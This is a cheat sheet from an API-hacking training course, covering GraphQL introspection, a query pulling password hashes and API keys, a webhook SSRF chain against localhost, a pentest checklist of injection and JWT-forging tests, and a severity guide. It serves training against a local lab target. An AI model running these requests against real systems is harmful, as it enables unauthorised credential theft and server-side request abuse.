# 🗂️ Cheat Sheet — Stage 7: Professional Mastery

## GraphQL Introspection

```bash
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}' | jq .

# Sensitive field extraction
curl -s -X POST http://localhost:5001/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { username email password_hash api_key internal_notes } }"}'
```

```graphql
# Full introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    types {
      name
      fields { name type { name kind } }
    }
  }
}
```

## Webhooks (SSRF chain)

```bash
curl -s -X POST http://localhost:5001/api/v1/webhook/register \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:9999/collect"}'

curl -s -X POST http://localhost:5001/api/v1/webhook/test/1 \
  -H "Authorization: Bearer $TOKEN"

curl -s http://localhost:5001/api/v1/webhook/list -H "Authorization: Bearer $TOKEN"
```

## Full Pentest Checklist

```
[ ] Recon: /, /api/v1/debug, /openapi.json, /swagger, ffuf on common paths
[ ] Auth: enumeration, brute force, predictable tokens, JWT weaknesses
[ ] BOLA: ID sweep on users/posts/messages/comments
[ ] Mass assignment: register + update with extra fields
[ ] BFLA: admin path guessing, JWT role forging
[ ] Rate limiting: rapid-fire requests on sensitive endpoints
[ ] Injection: SQLi (search), NoSQLi (user-lookup), CMDi (tools/*)
[ ] SSRF: upload/avatar, webhook/register+test
[ ] GraphQL: introspection, sensitive field extraction, nested queries
[ ] CORS: origin reflection test
[ ] Business logic: race conditions, workflow bypass, business-flow automation
[ ] Inventory: legacy API versions (/api/v0), leaked specs (/openapi.json)
[ ] Report: severity rating (Critical/High/Medium/Low), reproduction steps, remediation
```

## Business Logic Testing Patterns

```
- Can a step be skipped? (e.g. apply for badge without meeting criteria first)
- Can a step be repeated beyond intended limits? (like-bombing, badge re-apply)
- Can order of operations be reversed? (refund before purchase completes)
- Can quantities/amounts be negative or extreme? (rate=-999999)
- Can the flow be fully automated end-to-end with no human checkpoint?
```

## Report Severity Quick Guide

| Severity | Criteria |
|---|---|
| 🔴 Critical | Full account takeover, RCE, full DB dump, auth bypass |
| 🟠 High | Privilege escalation, sensitive data exposure at scale |
| 🟡 Medium | Info disclosure, business logic abuse, CORS misconfig |
| 🟢 Low | Verbose errors, missing security headers, minor info leak |

---
*SocialHack API Hacking Course — Stage 7 Cheat Sheet*
